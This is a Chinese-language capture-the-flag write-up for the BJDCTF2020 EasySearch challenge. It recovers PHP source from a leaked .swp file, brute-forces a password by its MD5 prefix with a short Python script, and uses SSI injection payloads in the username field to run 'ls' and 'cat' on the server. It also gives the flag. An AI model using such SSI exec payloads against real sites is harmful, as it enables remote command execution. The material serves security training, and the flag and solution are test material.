# [BJDCTF2020]EasySearch

[题目地址](https://buuoj.cn/challenges#[BJDCTF2020]EasySearch)

进入网站毫无头绪，没有头绪就扫目录。dirmap初始配置还没扫出来，只能看[wp](https://blog.csdn.net/weixin_45642610/article/details/115689130)后手动把index.php.swp补到字典里。

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {  //要求登录界面输入的password的md5值前6位是6d0bc1，爆破就好了
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";   //shtml是ssi注入的标志
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);   //每次登录都会把username写入到随机名字的shtml中
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

ssi注入漏洞可以参考这篇[文章](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x02-SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)。程序直接将用户名写入shtml中，如果我们的用户名是一串有意义的shtml代码，用户名的位置自然就能回显出执行结果。先爆破出password再说。

```python
要求password的md5值的前6个字符为6d0bc1。敲代码（python）：

from hashlib import md5

for i in range(10000000):
    if md5(str(i).encode('utf-8')).hexdigest()[:6] == '6d0bc1':
        print(i)
```

得到密码2020666。登录界面用户名与密码：

`username=<!--#exec cmd="ls ../" -->&password=2020666`

需要找到那个随机名字的shtml文件查看回显。url在服务器发送过来的response里可以看到，每次都不一样。访问得到以下内容：

- Hello,flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public

这flag名够长的。直接cat。

`username=<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2" -->" -->&password=2020666`

## Flag
> flag{b81f5d63-b86f-4530-9204-fb5cbd9c4888}